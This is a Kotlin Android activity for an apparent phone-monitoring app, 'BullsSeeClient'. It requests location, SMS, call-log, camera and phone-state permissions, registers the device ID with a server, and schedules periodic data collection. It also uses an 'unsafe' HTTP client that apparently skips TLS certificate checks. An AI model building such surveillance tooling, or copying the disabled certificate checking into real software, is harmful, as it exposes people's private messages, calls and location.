package com.example.bullsseeclient

import android.Manifest
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.POST
import java.time.Instant
import java.util.UUID
import java.util.concurrent.TimeUnit

class MainActivity : ComponentActivity() {
    private val deviceName: String by lazy {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            UUID.randomUUID().toString()
        } else {
            @Suppress("DEPRECATION")
            telephonyManager.deviceId ?: UUID.randomUUID().toString()
        }
    }

    private val permissionRequest = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val locationGranted = permissions[Manifest.permission.ACCESS_FINE_LOCATION] == true ||
                permissions[Manifest.permission.ACCESS_COARSE_LOCATION] == true
        val callLogGranted = permissions[Manifest.permission.READ_CALL_LOG] == true
        val smsGranted = permissions[Manifest.permission.READ_SMS] == true
        val cameraGranted = permissions[Manifest.permission.CAMERA] == true
        val phoneStateGranted = permissions[Manifest.permission.READ_PHONE_STATE] == true

        if (callLogGranted && smsGranted && cameraGranted && phoneStateGranted) {
            registerDevice()
            val workRequest = PeriodicWorkRequestBuilder<DataCollectionWorker>(15, TimeUnit.MINUTES)
                .build()
            WorkManager.getInstance(this).enqueue(workRequest)
        }
        if (locationGranted) {
            startService(Intent(this, LocationService::class.java))
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme { // Replaced BullsSeeTheme with MaterialTheme
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    MainScreen()
                }
            }
        }

        permissionRequest.launch(
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_PHONE_STATE
            )
        )
    }

    private fun registerDevice() {
        val retrofit = Retrofit.Builder()
            .baseUrl("https://localhost:7239/")
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()

        val apiService = retrofit.create(ApiService::class.java)
        val device = DeviceData(deviceName, Build.MODEL, Build.VERSION.RELEASE, Instant.now().toEpochMilli())
        val body = RequestBody.create("application/json".toMediaType(), Gson().toJson(device))
        apiService.registerDevice(body).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: Call<Void>, response: retrofit2.Response<Void>) {
                if (!response.isSuccessful) {
                    // Log failure
                }
            }
            override fun onFailure(call: Call<Void>, t: Throwable) {
                // Handle failure
            }
        })
    }

    data class DeviceData(val deviceName: String, val model: String, val osVersion: String, val lastUpdated: Long)

    interface ApiService {
        @POST("api/DeviceData/device-register")
        fun registerDevice(@Body data: RequestBody): Call<Void>
    }
}

@Composable
fun MainScreen() {
    Column(
        modifier = Modifier.fillMaxSize(),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text(
            text = "BullsSeeClient",
            fontSize = 24.sp,
            fontWeight = FontWeight.Bold,
            color = MaterialTheme.colorScheme.primary
        )
        Text(
            text = "Status: Awaiting Consent",
            fontSize = 16.sp,
            color = MaterialTheme.colorScheme.onSurface,
            modifier = Modifier.padding(top = 16.dp)
        )
    }
}